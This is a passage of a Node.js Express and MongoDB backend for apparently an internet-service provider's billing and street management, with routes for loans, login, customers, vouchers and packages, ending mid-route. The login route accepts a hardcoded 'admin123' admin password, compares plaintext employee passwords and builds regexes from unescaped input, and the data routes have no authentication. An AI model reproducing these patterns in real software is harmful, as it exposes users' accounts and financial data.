require('dotenv').config();
const express = require('express');
const { MongoClient, ObjectId } = require('mongodb');
const cors = require('cors');
const cron = require('node-cron');


const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = 'street_management';
let db;
let streetsCollection;
let usersCollection;
let packagesCollection;
let employeesCollection;
let equipmentCollection;
let remindersCollection;
let routersCollection;
let fiberCablesCollection;
let vouchersCollection;
let transactionsCollection;
let expensesCollection;
let monthlySalesCollection;
let complaintsCollection;
let notificationsCollection;
let incomesCollection;
let loansCollection;
let isConnected = false;
let client;

// PKT Timezone constant (UTC+05:00)
const PKT_OFFSET_MIN = 5 * 60;

// Connect to MongoDB with connection reuse for serverless
async function connectToDatabase() {
  if (isConnected && db) {
    console.log('Using existing database connection');
    return db;
  }

  try {
    // Validate MongoDB URI
    if (!MONGODB_URI) {
      throw new Error('MONGODB_URI environment variable is not set');
    }

    console.log('Creating new database connection...');
    console.log('MONGODB_URI exists:', !!MONGODB_URI);

    client = await MongoClient.connect(MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
      serverSelectionTimeoutMS: 10000, // 10 second timeout
    });

    console.log('MongoDB client connected');

    db = client.db(DB_NAME);
    streetsCollection = db.collection('streets');
    usersCollection = db.collection('users');
    packagesCollection = db.collection('packages');
    employeesCollection = db.collection('employees');
    equipmentCollection = db.collection('equipment');
    remindersCollection = db.collection('reminders');
    routersCollection = db.collection('routers');
    fiberCablesCollection = db.collection('fiberCables');
    vouchersCollection = db.collection('vouchers');
    transactionsCollection = db.collection('transactions');
    expensesCollection = db.collection('expenses');
    monthlySalesCollection = db.collection('monthlySales');
    complaintsCollection = db.collection('complaints');
    notificationsCollection = db.collection('notifications');
    incomesCollection = db.collection('incomes');
    loansCollection = db.collection('loans');

    console.log('Collections initialized:', {
      streets: !!streetsCollection,
      users: !!usersCollection,
      packages: !!packagesCollection,
      employees: !!employeesCollection,
      equipment: !!equipmentCollection,
      reminders: !!remindersCollection,
      routers: !!routersCollection,
      fiberCables: !!fiberCablesCollection,
      vouchers: !!vouchersCollection,
      transactions: !!transactionsCollection,
      expenses: !!expensesCollection,
      monthlySales: !!monthlySalesCollection,
      complaints: !!complaintsCollection,
      notifications: !!notificationsCollection,
      incomes: !!incomesCollection,
      loans: !!loansCollection
    });

    // Create unique index on name field
    await streetsCollection.createIndex({ name: 1 }, { unique: true }).catch(err => {
      console.log('Index may already exist:', err.message);
    });

    // Add critical performance indexes
    console.log('Creating performance indexes...');
    await usersCollection.createIndex({ status: 1 });
    await usersCollection.createIndex({ feeCollector: 1 });
    await usersCollection.createIndex({ assignTo: 1 });
    await usersCollection.createIndex({ userName: 1 });
    await usersCollection.createIndex({ userId: 1 });
    await usersCollection.createIndex({ simNo: 1 });
    await usersCollection.createIndex({ rechargeDate: 1 });
    await usersCollection.createIndex({ expiryDate: 1 });
    await vouchersCollection.createIndex({ userId: 1 });
    console.log('Performance indexes created successfully');

    isConnected = true;
    console.log('MongoDB connected successfully');

    // Initialize scheduled tasks after DB connection (only in non-serverless environment)
    if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
      initializeScheduledTasks();
    }

    return db;
  } catch (error) {
    console.error('MongoDB connection error:', error);
    console.error('Error details:', error.stack);
    throw error;
  }
}

// Middleware to ensure database connection
async function ensureDbConnection(req, res, next) {
  try {
    console.log(`[${req.method}] ${req.path} - Connection: ${isConnected}, DB: ${!!db}, Users: ${!!usersCollection}, Expenses: ${!!expensesCollection}`);

    if (!isConnected || !db || !usersCollection || !expensesCollection) {
      console.log('Database not connected or collections missing, connecting now...');
      await connectToDatabase();
      console.log('Database connected successfully in middleware');
    }

    // Double check core collections are initialized
    if (!usersCollection) {
      throw new Error('Users collection failed to initialize');
    }

    next();
  } catch (error) {
    console.error('Database connection error in middleware:', error);
    res.status(503).json({
      success: false,
      message: 'Database connection error',
      error: error.message
    });
  }
}

// Apply middleware to all routes
app.use(ensureDbConnection);

// Root route
app.get('/', (req, res) => {
  res.json({
    message: 'Street Management API',
    endpoints: {
      'POST /api/streets/add': 'Add a new street',
      'GET /api/streets': 'Get all streets',
      'GET /api/streets/:id': 'Get a street by ID',
      'DELETE /api/streets/:id': 'Delete a street'
    }
  });
});


// LOAN MANAGEMENT ENDPOINTS
app.post('/api/loans', ensureDbConnection, async (req, res) => {
  try {
    const { type, personName, amount, description, date } = req.body;
    if (!type || !personName || !amount) {
      return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    const loanRecord = {
      type, // 'given' or 'taken'
      personName,
      amount: parseFloat(amount),
      description: description || '',
      date: date ? new Date(date) : new Date(),
      createdAt: new Date()
    };

    const result = await loansCollection.insertOne(loanRecord);
    res.status(201).json({ success: true, data: { _id: result.insertedId, ...loanRecord } });
  } catch (error) {
    console.error('Error adding loan:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

app.get('/api/loans', ensureDbConnection, async (req, res) => {
  try {
    const loans = await loansCollection.find({}).sort({ date: -1 }).toArray();
    res.status(200).json({ success: true, data: loans });
  } catch (error) {
    console.error('Error fetching loans:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

app.get('/api/loans/stats', ensureDbConnection, async (req, res) => {
  try {
    const loans = await loansCollection.find({}).toArray();
    let totalGiven = 0;
    let totalTaken = 0;

    loans.forEach(loan => {
      if (loan.type === 'given') totalGiven += loan.amount;
      else if (loan.type === 'taken') totalTaken += loan.amount;
    });

    res.status(200).json({
      success: true,
      data: { totalGiven, totalTaken, netBalance: totalTaken - totalGiven }
    });
  } catch (error) {
    console.error('Error fetching loan stats:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

app.delete('/api/loans/:id', ensureDbConnection, async (req, res) => {
  try {
    const result = await loansCollection.deleteOne({ _id: new ObjectId(req.params.id) });
    if (result.deletedCount === 0) {
      return res.status(404).json({ success: false, message: 'Loan record not found' });
    }
    res.status(200).json({ success: true, message: 'Loan record deleted' });
  } catch (error) {
    console.error('Error deleting loan:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

app.put('/api/loans/:id', ensureDbConnection, async (req, res) => {
  try {
    const { type, personName, amount, description, date } = req.body;
    if (!type || !personName || !amount) {
      return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    const updatedRecord = {
      type,
      personName,
      amount: parseFloat(amount),
      description: description || '',
      date: date ? new Date(date) : new Date()
    };

    const result = await loansCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      { $set: updatedRecord }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({ success: false, message: 'Loan record not found' });
    }

    res.status(200).json({ success: true, data: { _id: req.params.id, ...updatedRecord } });
  } catch (error) {
    console.error('Error updating loan:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

// POST /api/auth/login
app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    console.log(`🔐 Login attempt: ${username}`);

    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password required' });
    }

    // Default admin login
    if (username.toLowerCase() === 'admin' && password === 'admin123') {
      return res.status(200).json({
        success: true,
        user: { name: 'Admin', role: 'admin' }
      });
    }

    // Check employees collection for fee collectors or technicians
    const employee = await db.collection('employees').findOne({
      name: { $regex: new RegExp(`^${username.trim()}$`, 'i') }
    });

    // Check passwords (in a real app, use hashing!)
    if (employee && employee.password === password) {
      return res.status(200).json({
        success: true,
        user: { name: employee.name, role: employee.role || 'employee' }
      });
    }

    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ success: false, message: 'Internal server error during login' });
  }
});

app.get('/api/delteincomes', async (req, res) => {
  try {
    // Fetch all incomes
    const incomes = await incomesCollection.find({}).toArray();

    res.status(200).json({
      success: true,
      message: 'Incomes fetched successfully',
      data: incomes
    });
  } catch (error) {
    console.error('Error fetching incomes:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching incomes',
      error: error.message
    });
  }
});

// POST route to save a street name
app.post('/api/streets/add', async (req, res) => {
  try {
    const { name } = req.body;

    if (!name) {
      return res.status(400).json({
        success: false,
        message: 'Street name is required'
      });
    }

    // Check if street already exists
    const existingStreet = await streetsCollection.findOne({ name: name.trim() });
    if (existingStreet) {
      return res.status(409).json({
        success: false,
        message: 'Street name already exists'
      });
    }

    // Create new street
    const street = {
      name: name.trim(),
      createdAt: new Date()
    };

    const result = await streetsCollection.insertOne(street);

    res.status(201).json({
      success: true,
      message: 'Street saved successfully',
      data: {
        _id: result.insertedId,
        ...street
      }
    });
  } catch (error) {
    console.error('Error saving street:', error);
    res.status(500).json({
      success: false,
      message: 'Error saving street',
      error: error.message
    });
  }
});

// GET route to fetch all streets
app.get('/api/streets', async (req, res) => {
  try {
    const streets = await streetsCollection.find().sort({ createdAt: -1 }).toArray();
    res.status(200).json({
      success: true,
      count: streets.length,
      data: streets
    });
  } catch (error) {
    console.error('Error fetching streets:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching streets',
      error: error.message
    });
  }
});

// GET route to fetch a single street by ID
app.get('/api/streets/:id', async (req, res) => {
  try {
    const street = await streetsCollection.findOne({ _id: new ObjectId(req.params.id) });
    if (!street) {
      return res.status(404).json({
        success: false,
        message: 'Street not found'
      });
    }
    res.status(200).json({
      success: true,
      data: street
    });
  } catch (error) {
    console.error('Error fetching street:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching street',
      error: error.message
    });
  }
});

// PUT route to update a street
app.put('/api/streets/:id', async (req, res) => {
  try {
    const { name } = req.body;

    if (!name) {
      return res.status(400).json({
        success: false,
        message: 'Street name is required'
      });
    }

    const result = await streetsCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      { $set: { name: name.trim() } }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Street not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Street updated successfully'
    });
  } catch (error) {
    console.error('Error updating street:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating street',
      error: error.message
    });
  }
});

// DELETE route to delete a street
app.delete('/api/streets/:id', async (req, res) => {
  try {
    const result = await streetsCollection.deleteOne({ _id: new ObjectId(req.params.id) });
    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Street not found'
      });
    }
    res.status(200).json({
      success: true,
      message: 'Street deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting street:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting street',
      error: error.message
    });
  }
});

// ============ USERS API ROUTES ============

// POST route to add a new user
app.post('/api/users', async (req, res) => {
  try {
    const {
      userName,
      userId,
      simNo,
      whatsappNo,
      packageName,
      discount,
      amount,
      connectionType,
      streetName,
      switchSplitter,
      assignTo,
      feeCollector,
      rechargeDate,
      expiryDate,
      status,
      paymentType,
      numberOfMonths
    } = req.body;

    if (!userName) {
      return res.status(400).json({
        success: false,
        message: 'User name is required'
      });
    }

    // Calculate total amount based on numberOfMonths
    const packageFeePerMonth = parseFloat(amount) || 0;
    const discountPerMonth = parseFloat(discount) || 0;
    const monthlyFeeAfterDiscount = packageFeePerMonth - discountPerMonth;
    const totalAmountForAllMonths = monthlyFeeAfterDiscount * (numberOfMonths || 1);

    console.log('💰 User Payment Calculation:', {
      packageFeePerMonth,
      discountPerMonth,
      monthlyFeeAfterDiscount,
      numberOfMonths,
      totalAmountForAllMonths,
      paymentType
    });

    // Parse expiry date to check if it's future
    const nowUTC = new Date();
    const nowInPKT = new Date(nowUTC.getTime() + PKT_OFFSET_MIN * 60000);
    const todayY = nowInPKT.getUTCFullYear();
    const todayM = nowInPKT.getUTCMonth();
    const todayD = nowInPKT.getUTCDate();

    const parseExpiryDate = (expStr) => {
      if (!expStr) return null;
      const parts = String(expStr).split(/[-\/]/);
      if (parts.length === 3) {
        const d = parseInt(parts[0], 10);
        const m = parseInt(parts[1], 10) - 1;
        const y = parseInt(parts[2], 10);
        if (!isNaN(d) && !isNaN(m) && !isNaN(y)) {
          return { y, m, d };
        }
      }
      return null;
    };

    const expiryYMD = parseExpiryDate(expiryDate);
    const isFutureExpiry = expiryYMD && (
      expiryYMD.y > todayY ||
      (expiryYMD.y === todayY && expiryYMD.m > todayM) ||
      (expiryYMD.y === todayY && expiryYMD.m === todayM && expiryYMD.d > todayD)
    );

    console.log('📅 Expiry Date Check:', {
      expiryDate,
      expiryYMD,
      todayYMD: { y: todayY, m: todayM, d: todayD },
      isFutureExpiry
    });

    // Determine payment status
    let paymentStatus = 'unpaid'; // Default
    let paidAmount = 0;
    let remainingAmount = totalAmountForAllMonths;

    // Payment status logic:
    // - Pay Now: paid/partial (shows in Paid + Expiring Soon)
    // - Pay Later: always unpaid (shows in Unpaid Users)
    // - Checkbox: pending (shows in Expiring Soon only)
    if (status === 'pending') {
      // Explicit pending (checkbox)
      paymentStatus = 'pending';
      console.log('✅ Checkbox: pending status');
    } else if (paymentType === 'now') {
      // Pay Now: Always paid/partial (regardless of expiry date)
      paymentStatus = numberOfMonths > 1 ? 'partial' : 'paid';
      paidAmount = monthlyFeeAfterDiscount;
      remainingAmount = totalAmountForAllMonths - monthlyFeeAfterDiscount;
      console.log('✅ Pay Now: paid/partial status (shows in Paid + Expiring Soon)');
    } else if (paymentType === 'later') {
      // Pay Later: Always unpaid (shows in Unpaid Users)
      paymentStatus = 'unpaid';
      console.log('✅ Pay Later: unpaid status (shows in Unpaid Users)');
    }

    console.log('📊 Final Payment Status:', {
      paymentStatus,
      paidAmount,
      remainingAmount
    });

    // Check if expiry date is TODAY (before 12 PM) or TOMORROW - if yes, set showInExpiringSoon flag
    const currentHourPKT = nowInPKT.getUTCHours();

    const tomorrowDate = new Date(Date.UTC(todayY, todayM, todayD + 1));
    const tomorrowY = tomorrowDate.getUTCFullYear();
    const tomorrowM = tomorrowDate.getUTCMonth();
    const tomorrowD = tomorrowDate.getUTCDate();

    const isExpiringToday = expiryYMD &&
      expiryYMD.y === todayY &&
      expiryYMD.m === todayM &&
      expiryYMD.d === todayD;

    const isExpiringTomorrow = expiryYMD &&
      expiryYMD.y === tomorrowY &&
      expiryYMD.m === tomorrowM &&
      expiryYMD.d === tomorrowD;

    // Set flag if:
    // 1. Expires tomorrow (always)
    // 2. Expires today BUT current time is before 12 PM
    const shouldShowInExpiringSoon = isExpiringTomorrow || (isExpiringToday && currentHourPKT < 12);

    if (shouldShowInExpiringSoon) {
      if (isExpiringToday && currentHourPKT < 12) {
        console.log('🔔 User expires TODAY (before 12 PM) - Setting showInExpiringSoon flag immediately');
      } else if (isExpiringTomorrow) {
        console.log('🔔 User expires TOMORROW - Setting showInExpiringSoon flag immediately');
      }
    }

    const newUser = {
      userName: userName.trim(),
      userId: userId ? userId.trim() : '',
      simNo: simNo ? simNo.trim() : '',
      whatsappNo: whatsappNo ? whatsappNo.trim() : '',
      packageName: packageName || '',
      discount: discount || 0,
      amount: amount || 0, // Single month package fee
      totalAmount: totalAmountForAllMonths, // Total for all months
      numberOfMonths: numberOfMonths || 1,
      connectionType: connectionType || 'Local',
      streetName: streetName || '',
      switchSplitter: switchSplitter ? switchSplitter.trim() : '',
      assignTo: assignTo ? assignTo.trim() : '',
      feeCollector: feeCollector ? feeCollector.trim() : '',
      rechargeDate: rechargeDate || null,
      expiryDate: expiryDate || null,
      status: paymentStatus, // Payment status: paid, unpaid, partial, pending
      serviceStatus: 'active', // Service status: always active for new users
      paidAmount: paidAmount,
      remainingAmount: remainingAmount,
      unpaidSince: paymentStatus === 'unpaid' ? new Date() : null,
      showInExpiringSoon: shouldShowInExpiringSoon, // Set if expires today (before 12 PM) or tomorrow
      createdAt: new Date()
    };

    const result = await usersCollection.insertOne(newUser);
    const newUserId = result.insertedId;

    // Voucher creation functionality has been removed from this endpoint
    // Vouchers will be created separately through the dedicated voucher endpoint
    // VoucherModal will handle all voucher creation including expired users

    res.status(201).json({
      success: true,
      message: 'User added successfully',
      data: { _id: newUserId, ...newUser }
    });
  } catch (error) {
    console.error('Error adding user:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding user',
      error: error.message
    });
  }
});

// GET route to fetch all users (with optional search)
app.get('/api/users', async (req, res) => {
  try {
    // Explicit check for collection initialization
    if (!usersCollection) {
      console.error('usersCollection is undefined! DB connection status:', isConnected);
      return res.status(503).json({
        success: false,
        message: 'Database not initialized',
        error: 'Collections are not ready'
      });
    }

    // Check if search query is provided
    const searchQuery = req.query.search;
    const feeCollector = req.query.feeCollector; // Fee collector filter
    const assignTo = req.query.assignTo; // Technician assignment filter

    let query = {};

    if (searchQuery) {
      // Search in userName, userId, and phoneNumber fields (case-insensitive)
      query = {
        $or: [
          { userName: { $regex: searchQuery, $options: 'i' } },
          { userId: { $regex: searchQuery, $options: 'i' } },
          { phoneNumber: { $regex: searchQuery, $options: 'i' } }
        ]
      };
    }

    // STRICT: Filter by fee collector if provided (case-insensitive) - ALWAYS apply
    if (feeCollector) {
      const feeCollectorTrimmed = feeCollector.trim();
      if (feeCollectorTrimmed) {
        query.feeCollector = { $regex: new RegExp(`^${feeCollectorTrimmed}$`, 'i') };
        console.log(`🔒 STRICT: Filtering /api/users by fee collector (case-insensitive): ${feeCollectorTrimmed}`);
      }
    }

    // STRICT: Filter by assignTo (technician) if provided (case-insensitive) - ALWAYS apply
    if (assignTo) {
      const assignToTrimmed = assignTo.trim();
      if (assignToTrimmed) {
        query.assignTo = { $regex: new RegExp(`^${assignToTrimmed}$`, 'i') };
        console.log(`🔒 STRICT: Filtering /api/users by assignTo (technician, case-insensitive): ${assignToTrimmed}`);
      }
    }

    const users = await usersCollection.find(query).sort({ userName: 1 }).toArray();
    res.status(200).json({
      success: true,
      count: users.length,
      data: users
    });
  } catch (error) {
    console.error('Error fetching users:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching users',
      error: error.message
    });
  }
});

// PUT route to update a user
app.put('/api/users/:id', async (req, res) => {
  try {
    // Validate ObjectId format
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid user ID format'
      });
    }

    const {
      name,
      userName,
      userId,
      simNo,
      whatsappNo,
      packageName,
      discount,
      amount,
      connectionType,
      streetName,
      switchSplitter,
      assignTo,
      feeCollector,
      rechargeDate,
      expiryDate,
      networkType,
      status,
      serviceStatus,
      paidAmount,
      remainingAmount,
      currentFee
    } = req.body;

    // Build update object dynamically
    const updateFields = {};

    if (name) updateFields.name = name.trim();
    if (userName) updateFields.userName = userName.trim();
    if (userId !== undefined) updateFields.userId = userId ? userId.trim() : '';
    if (simNo !== undefined) updateFields.simNo = simNo ? simNo.trim() : '';
    if (whatsappNo !== undefined) updateFields.whatsappNo = whatsappNo ? whatsappNo.trim() : '';
    if (packageName !== undefined) updateFields.packageName = packageName || '';
    if (discount !== undefined) updateFields.discount = discount || 0;
    if (amount !== undefined) updateFields.amount = amount || 0;
    if (connectionType !== undefined) updateFields.connectionType = connectionType || '';
    if (streetName !== undefined) updateFields.streetName = streetName || '';
    if (switchSplitter !== undefined) updateFields.switchSplitter = switchSplitter ? switchSplitter.trim() : '';
    if (assignTo !== undefined) updateFields.assignTo = assignTo ? assignTo.trim() : '';
    if (feeCollector !== undefined) updateFields.feeCollector = feeCollector ? feeCollector.trim() : '';
    if (rechargeDate !== undefined) updateFields.rechargeDate = rechargeDate || null;
    if (expiryDate !== undefined) updateFields.expiryDate = expiryDate || null;
    if (networkType !== undefined) updateFields.networkType = networkType || 'local';
    if (status !== undefined) updateFields.status = status;
    if (serviceStatus !== undefined) updateFields.serviceStatus = serviceStatus;
    if (paidAmount !== undefined) updateFields.paidAmount = paidAmount || 0;
    if (remainingAmount !== undefined) updateFields.remainingAmount = remainingAmount || 0;
    if (currentFee !== undefined) updateFields.currentFee = currentFee || 0;

    // If status is being changed, manage unpaidSince timestamp
    if (status !== undefined) {
      // Fetch current user to detect transitions
      const existingUser = await usersCollection.findOne(
        { _id: new ObjectId(req.params.id) },
        { projection: { status: 1, unpaidSince: 1 } }
      );
      if (status === 'unpaid') {
        // Set unpaidSince only if not already set
        if (!existingUser?.unpaidSince) updateFields.unpaidSince = new Date();
      } else {
        // Clearing unpaid state, remove timestamp
        if (existingUser?.unpaidSince) updateFields.unpaidSince = null;
      }
    }

    if (Object.keys(updateFields).length === 0) {
      return res.status(400).json({
        success: false,
        message: 'No fields to update'
      });
    }

    // Check if expiry date is being updated and if it's TODAY (before 12 PM) or TOMORROW
    if (expiryDate !== undefined) {
      const nowUTC = new Date();
      const nowInPKT = new Date(nowUTC.getTime() + PKT_OFFSET_MIN * 60000);
      const todayY = nowInPKT.getUTCFullYear();
      const todayM = nowInPKT.getUTCMonth();
      const todayD = nowInPKT.getUTCDate();
      const currentHourPKT = nowInPKT.getUTCHours();

      const tomorrowDate = new Date(Date.UTC(todayY, todayM, todayD + 1));
      const tomorrowY = tomorrowDate.getUTCFullYear();
      const tomorrowM = tomorrowDate.getUTCMonth();
      const tomorrowD = tomorrowDate.getUTCDate();

      // Parse expiry date
      const parseExpiryDate = (expStr) => {
        if (!expStr) return null;
        const parts = String(expStr).split(/[-\/]/);
        if (parts.length === 3) {
          const d = parseInt(parts[0], 10);
          const m = parseInt(parts[1], 10) - 1;
          const y = parseInt(parts[2], 10);
          if (!isNaN(d) && !isNaN(m) && !isNaN(y)) {
            return { y, m, d };
          }
        }
        return null;
      };

      const expiryYMD = parseExpiryDate(expiryDate);

      const isExpiringToday = expiryYMD &&
        expiryYMD.y === todayY &&
        expiryYMD.m === todayM &&
        expiryYMD.d === todayD;

      const isExpiringTomorrow = expiryYMD &&
        expiryYMD.y === tomorrowY &&
        expiryYMD.m === tomorrowM &&
        expiryYMD.d === tomorrowD;

      // Set flag if:
      // 1. Expires tomorrow (always)
      // 2. Expires today BUT current time is before 12 PM
      const shouldShowInExpiringSoon = isExpiringTomorrow || (isExpiringToday && currentHourPKT < 12);

      if (shouldShowInExpiringSoon) {
        if (isExpiringToday && currentHourPKT < 12) {
          console.log('🔔 User expires TODAY (before 12 PM) - Setting showInExpiringSoon flag');
        } else if (isExpiringTomorrow) {
          console.log('🔔 User expires TOMORROW - Setting showInExpiringSoon flag');
        }
        updateFields.showInExpiringSoon = true;
      } else {
        // If expiry date is not today/tomorrow, remove flag
        updateFields.showInExpiringSoon = false;
      }
    }

    const result = await usersCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      { $set: updateFields }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    // If package name, amount, or discount is being updated, also update related vouchers
    if (packageName !== undefined || amount !== undefined || discount !== undefined) {
      try {
        console.log('📦 Updating vouchers for package change:', {
          userId: req.params.id,
          newPackageName: packageName,
          newAmount: amount
        });

        // Update vouchers that have unpaid months for this user
        const voucherUpdateFields = {};
        if (packageName !== undefined) voucherUpdateFields['months.$[elem].packageName'] = packageName;
        if (amount !== undefined) {
          voucherUpdateFields['months.$[elem].packageFee'] = amount;
        }

        // If amount or discount changed, recalculate remaining amount for unpaid months
        if (amount !== undefined || discount !== undefined) {
          // Get the current user data to have full context
          const currentUser = await usersCollection.findOne({ _id: new ObjectId(req.params.id) });
          const currentAmount = amount !== undefined ? amount : (currentUser?.amount || 0);
          const currentDiscount = discount !== undefined ? discount : (currentUser?.discount || 0);
          const finalAmount = currentAmount - currentDiscount;

          voucherUpdateFields['months.$[elem].packageFee'] = currentAmount;
          voucherUpdateFields['months.$[elem].discount'] = currentDiscount;
          voucherUpdateFields['months.$[elem].remainingAmount'] = finalAmount;

          console.log('💰 Updating voucher amounts:', {
            currentAmount,
            currentDiscount,
            finalAmount
          });
        }

        if (Object.keys(voucherUpdateFields).length > 0) {
          await vouchersCollection.updateMany(
            { userId: req.params.id },
            { $set: voucherUpdateFields },
            {
              arrayFilters: [
                {
                  $or: [
                    { 'elem.status': 'unpaid' },
                    { 'elem.remainingAmount': { $gt: 0 } }
                  ]
                }
              ]
            }
          );
          console.log('✅ Vouchers updated for package change');
        }
      } catch (voucherError) {
        console.error('⚠️ Error updating vouchers:', voucherError);
        // Don't fail the user update if voucher update fails
      }
    }

    res.status(200).json({
      success: true,
      message: 'User updated successfully'
    });
  } catch (error) {
    console.error('Error updating user:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating user',
      error: error.message
    });
  }
});

// DELETE route to delete a user
app.delete('/api/users/:id', async (req, res) => {
  try {
    // Validate ObjectId format
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid user ID format'
      });
    }

    const userId = new ObjectId(req.params.id);

    // STEP 1: Fetch all vouchers for this user BEFORE deleting
    const userVouchers = await vouchersCollection.find({ userId: req.params.id }).toArray();
    console.log(`🔍 Found ${userVouchers.length} vouchers for user ${req.params.id}`);

    // STEP 2: Calculate income to deduct based on payment method
    const incomeDeductions = {}; // { receiverName: { cashIncome: amount, bankIncome: amount } }

    for (const voucher of userVouchers) {
      if (voucher.months && Array.isArray(voucher.months)) {
        for (const month of voucher.months) {
          // Skip reversed/refunded months
          if (month.status === 'reversed' || month.refundDate || month.refundedAmount) {
            continue;
          }

          // Check payment history first (new structure)
          const paymentHistory = month.paymentHistory || [];

          if (paymentHistory.length > 0) {
            // New structure: Process each payment
            for (const payment of paymentHistory) {
              const receiver = payment.receivedBy || 'Admin';
              const amount = parseFloat(payment.amount) || 0;
              const paymentMethod = (payment.paymentMethod || '').trim().toLowerCase();

              if (amount > 0) {
                if (!incomeDeductions[receiver]) {
                  incomeDeductions[receiver] = { cashIncome: 0, bankIncome: 0 };
                }

                if (paymentMethod === 'cash') {
                  incomeDeductions[receiver].cashIncome += amount;
                } else if (paymentMethod === 'bank transfer') {
                  incomeDeductions[receiver].bankIncome += amount;
                }

                console.log(`   💰 Deduct: ${receiver} - ${paymentMethod}: Rs ${amount}`);
              }
            }
          } else if (month.receivedBy && (month.status === 'paid' || month.status === 'partial')) {
            // Old structure: Single receivedBy field
            const receiver = month.receivedBy;
            const amount = parseFloat(month.paidAmount) || 0;
            const paymentMethod = (month.paymentMethod || '').trim().toLowerCase();

            if (amount > 0) {
              if (!incomeDeductions[receiver]) {
                incomeDeductions[receiver] = { cashIncome: 0, bankIncome: 0 };
              }

              if (paymentMethod === 'cash') {
                incomeDeductions[receiver].cashIncome += amount;
              } else if (paymentMethod === 'bank transfer') {
                incomeDeductions[receiver].bankIncome += amount;
              } else {
                // If payment method not specified, deduct from cashIncome
                incomeDeductions[receiver].cashIncome += amount;
              }

              console.log(`   💰 Deduct (old): ${receiver} - ${paymentMethod || 'cash'}: Rs ${amount}`);
            }
          }
        }
      }
    }

    // STEP 3: Update income collection - deduct amounts (prevent negative values)
    for (const [receiver, deductions] of Object.entries(incomeDeductions)) {
      const { cashIncome, bankIncome } = deductions;

      if (cashIncome > 0 || bankIncome > 0) {
        // CRITICAL: Fetch current income first to prevent negative values
        const currentIncomeRecord = await incomesCollection.findOne({
          name: { $regex: new RegExp(`^${receiver.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') }
        });

        if (currentIncomeRecord) {
          const currentCash = currentIncomeRecord.cashIncome || 0;
          const currentBank = currentIncomeRecord.bankIncome || 0;

          // Calculate new values (don't go below 0)
          const newCash = Math.max(0, currentCash - cashIncome);
          const newBank = Math.max(0, currentBank - bankIncome);

          await incomesCollection.updateOne(
            { name: { $regex: new RegExp(`^${receiver.trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') } },
            {
              $set: {
                cashIncome: newCash,
                bankIncome: newBank,
                lastUpdated: new Date()
              }
            }
          );

          console.log(`✅ Deducted from ${receiver}: Cash Rs ${currentCash} → Rs ${newCash}, Bank Rs ${currentBank} → Rs ${newBank}`);
        } else {
          console.log(`⚠️ No income record found for ${receiver}, skipping deduction`);
        }
      }
    }

    // STEP 4: Delete all vouchers for this user
    const vouchersResult = await vouchersCollection.deleteMany({ userId: req.params.id });
    console.log(`🗑️ Deleted ${vouchersResult.deletedCount} vouchers for user ${req.params.id}`);

    // STEP 5: Delete the user
    const result = await usersCollection.deleteOne({ _id: userId });
    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'User, vouchers, and income adjustments completed successfully',
      deletedVouchersCount: vouchersResult.deletedCount,
      incomeDeductions: incomeDeductions
    });
  } catch (error) {
    console.error('Error deleting user:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting user',
      error: error.message
    });
  }
});

// ============ PACKAGES API ROUTES ============

// POST route to add a package
app.post('/api/packages/add', async (req, res) => {
  try {
    const { name, speed, price } = req.body;

    if (!name || !speed || !price) {
      return res.status(400).json({
        success: false,
        message: 'Name, speed, and price are required'
      });
    }

    const package = {
      name: name.trim(),
      speed: speed.trim(),
      price: parseFloat(price),
      createdAt: new Date()
    };

    const result = await packagesCollection.insertOne(package);

    res.status(201).json({
      success: true,
      message: 'Package added successfully',
      data: {
        _id: result.insertedId,
        ...package
      }
    });
  } catch (error) {
    console.error('Error adding package:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding package',
      error: error.message
    });
  }
});

// GET route to fetch all packages
app.get('/api/packages', async (req, res) => {
  try {
    const packages = await packagesCollection.find().sort({ createdAt: -1 }).toArray();
    res.status(200).json({
      success: true,
      count: packages.length,
      data: packages
    });
  } catch (error) {
    console.error('Error fetching packages:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching packages',
      error: error.message
    });
  }
});

// PUT route to update a package
app.put('/api/packages/:id', async (req, res) => {
  try {
    const { name, speed, price } = req.body;

    if (!name || !speed || !price) {
